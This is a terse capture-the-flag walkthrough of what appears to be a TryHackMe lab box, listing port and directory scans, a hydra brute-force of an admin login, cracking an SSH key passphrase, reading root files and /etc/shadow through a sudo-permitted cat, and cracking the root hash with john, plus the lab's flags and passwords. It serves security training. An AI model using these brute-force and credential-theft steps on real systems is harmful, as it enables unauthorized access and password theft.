**Tristan Gomez**

nmap
```
└─$ sudo nmap -sS -sV 10.10.102.54
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-23 14:58 PDT
Nmap scan report for 10.10.102.54
Host is up (0.17s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.59 seconds

```


gobuster results
```
/.hta                 (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/admin                (Status: 301) [Size: 312] [--> http://10.10.102.54/admin/]
/index.html           (Status: 200) [Size: 10918]                               
/server-status        (Status: 403) [Size: 277]      
```

/admin 

`<!-- Hey john, if you do not remember, the username is admin -->` hidden comment in source

`hydra -l admin -P /usr/share/wordlists/rockyou.txt  10.10.102.54 http-form-post "/admin:user=^USER^&pass=^PASS^&LOGIN=Login:Username or password invalid"`

```
[80][http-post-form] host: 10.10.102.54   login: admin   password: 123456
[80][http-post-form] host: 10.10.102.54   login: admin   password: iloveyou
[80][http-post-form] host: 10.10.102.54   login: admin   password: password
[80][http-post-form] host: 10.10.102.54   login: admin   password: nicole
[80][http-post-form] host: 10.10.102.54   login: admin   password: 12345678
[80][http-post-form] host: 10.10.102.54   login: admin   password: abc123
[80][http-post-form] host: 10.10.102.54   login: admin   password: 12345
[80][http-post-form] host: 10.10.102.54   login: admin   password: princess
[80][http-post-form] host: 10.10.102.54   login: admin   password: daniel
[80][http-post-form] host: 10.10.102.54   login: admin   password: rockyou
[80][http-post-form] host: 10.10.102.54   login: admin   password: 1234567
[80][http-post-form] host: 10.10.102.54   login: admin   password: 123456789
[80][http-post-form] host: 10.10.102.54   login: admin   password: babygirl
[80][http-post-form] host: 10.10.102.54   login: admin   password: jessica
[80][http-post-form] host: 10.10.102.54   login: admin   password: monkey
[80][http-post-form] host: 10.10.102.54   login: admin   password: lovely

```

hydra
`hydra -l admin -P /usr/share/wordlists/rockyou.txt  10.10.102.54 http-form-post "/admin/index.php:user=^USER^&pass=^PASS^:F=Username or password invalid" -V`
`[80][http-post-form] host: 10.10.102.54   login: admin   password: xavier`

first flag
`THM{brut3_f0rce_is_e4sy}`

john's id_rsa
key to id_rsa =`rockinroll       (id_rsa)`

ssh in as `john`

user.txt
```
john@bruteit:~$ cat user.txt
THM{a_password_is_not_a_barrier}
```

```
john@bruteit:~$ sudo -l
Matching Defaults entries for john on bruteit:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User john may run the following commands on bruteit:
    (root) NOPASSWD: /bin/cat
```
```
john@bruteit:/$ sudo /bin/cat root/root.txt
THM{pr1v1l3g3_3sc4l4t10n}
```

copy /etc/passwd and /etc/shadow

run `unshadow passwd shadow > unshadowed.txt` to combine them

then run john
`john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt `
`football         (root)`
